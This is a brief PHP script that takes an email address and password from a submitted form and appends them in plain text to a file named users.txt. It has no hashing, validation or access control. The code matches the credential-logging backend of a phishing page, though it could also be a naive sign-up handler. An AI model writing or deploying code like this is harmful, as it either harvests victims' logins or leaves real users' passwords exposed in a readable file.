<?php
// Get the form data
$email = $_POST['email'];
$password = $_POST['psw'];

// Open the file for appending
$file = fopen("users.txt", "a");

// Write the data to the file
fwrite($file, "$email, $password\n");

// Close the file
fclose($file);
?>
